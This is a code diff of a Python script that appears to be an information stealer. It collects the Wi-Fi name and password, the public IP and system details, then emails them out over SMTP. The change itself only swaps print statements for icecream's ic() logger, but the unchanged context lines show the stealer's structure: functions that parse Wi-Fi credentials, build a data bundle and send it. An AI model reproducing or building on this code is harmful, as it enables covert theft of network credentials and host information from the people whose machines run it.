@@ -1,6 +1,7 @@
 import lxml, requests, socket, smtplib, os
 import subprocess as sp 
 import platform as pf
+from icecream import ic
 from dotenv import load_dotenv
 from bs4 import BeautifulSoup
 from time import sleep
@@ -22,7 +23,7 @@ def wifi_parser():
     global data
     data = f"Wifi name: {name}\nWifi password: {password}"
     
-    print("Wifi parse sucessful complete")
+    ic("Wifi parse sucessful complete")
     
 def get_ip():
     response = requests.get(url="https://yandex.kz/internet")
@@ -33,7 +34,7 @@ def get_ip():
     global data_ip
     data_ip = f"IP ADDRES: {ip}"
     
-    print("Get ip sucessful complete")
+    ic("Get ip sucessful complete")
     
 def info_pc():
     processor = pf.processor()
@@ -44,13 +45,13 @@ def info_pc():
     global Pc
     Pc = f"Processor: {processor}\nSystem: {sys}\nNet name: {net_pc}\nIp addres pc: {ip_pc}"
     
-    print("Sys info sucessful complete")
+    ic("Sys info sucessful complete")
     
 def all_info():
     global data_all_info
     data_all_info = f"{data}\n{data_ip}\n{Pc}"
     
-    print("All info  sucessful complete")
+    ic("All info  sucessful complete")
     
 def send():
     msg = MIMEMultipart()
@@ -67,9 +68,9 @@ def send():
         server.send_message(msg)
         server.quit()
     except Exception as ex:
-        print(ex)
+        ic(ex)
     finally:
-        print("Send sucessful complete")
+        ic("Send sucessful complete")
     
 def main():
     load_dotenv()
@@ -81,4 +82,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-    print("All good")
+    ic("All good")
